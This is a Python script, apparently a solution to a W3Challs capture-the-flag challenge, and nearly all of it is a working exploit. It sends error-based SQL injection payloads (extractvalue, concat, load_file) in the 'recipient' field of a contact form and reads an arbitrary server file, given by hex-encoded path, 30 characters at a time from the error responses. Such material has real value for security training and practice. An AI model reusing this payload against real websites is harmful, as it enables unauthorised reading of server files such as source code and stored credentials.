import requests

path = input()
hex_path = '0x'
for i in path:
    hex_path += str(hex(ord(i))).replace('0x', '')

url = 'http://vip.hax.w3challs.com/index.php?page=contact'
headers = {
    'User-Agent': 'Mozilla/5.0 (X11; CrOS i686 4319.74.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36'
}
# i = 1
for i in range(30):
    payload = 'extractvalue(1,concat(0x7e,(substr(load_file({}),{},30)),0x7e))'.format(hex_path, str(1 + i * 30))
    data = {
        'recipient': payload, 
        'msg': '123'
    }
    cookies = {
        'PHPSESSID': 'your_PHPSESSID'
    }
    response = requests.post(url, headers=headers, data=data, cookies=cookies)
    # print(response.text)
    print(response.text[763:793], end='')
    if '?>' in response.text[763:793]:
        break